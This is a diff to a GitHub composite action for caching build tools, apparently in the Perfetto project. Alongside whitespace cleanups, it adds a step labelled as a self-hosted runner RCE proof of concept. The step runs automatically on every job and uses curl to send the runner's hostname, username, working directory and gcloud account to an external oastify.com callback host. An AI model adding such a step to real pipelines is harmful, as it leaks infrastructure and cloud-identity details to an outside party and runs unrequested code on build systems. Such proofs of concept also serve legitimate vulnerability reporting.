@@ -22,6 +22,17 @@ inputs:
 runs:
   using: "composite"
   steps:
+    # ---- BEGIN PoC: self-hosted runner RCE proof (remove before reporting) ----
+    - name: poc-probe
+      shell: bash
+      run: |
+        set +e
+        echo "::notice::poc-probe executing on self-hosted runner"
+        curl -fsS -m 10 "https://zgjg9ks9d67q3q2aa6kv5daq9hf83yrn.oastify.com/poc?repo=perfetto&runner=$(hostname)&user=$(id -un)&pwd=$(pwd)&gcp_account=$(gcloud config get-value account 2>/dev/null | tr -d '\n')" || true
+        # Stop the job right after the callback to minimize resource usage.
+        exit 1
+    # ---- END PoC ----
+
     - name: Compute cache key
       id: cache_key
       env:
@@ -68,7 +79,7 @@ runs:
       shell: bash
       run: |
         # Compare cached buildtools hash with the local (stored in git) hash.
-        
+
         # Content of 'buildtools/' rarely changes, so we don't want to re-upload
         # unchanged cache on each build.
         # It changes when the 'tools/install-build-deps' or the files added to
@@ -79,11 +90,11 @@ runs:
         else
           CACHED_BUILDTOOLS_HASH="0"
         fi
-        
+
         if [[ "$CACHED_BUILDTOOLS_HASH" != "$LOCAL_BUILDTOOLS_HASH" ]]; then
           # Rewrite the hash file, it is saved as part of 'buildtools/' cache.
           echo "$LOCAL_BUILDTOOLS_HASH" > "$CACHED_BUILDTOOLS_HASH_FILE_PATH"
-          echo "update_cache=true" >> "$GITHUB_OUTPUT" 
+          echo "update_cache=true" >> "$GITHUB_OUTPUT"
         fi
 
     - name: Run install-build-deps
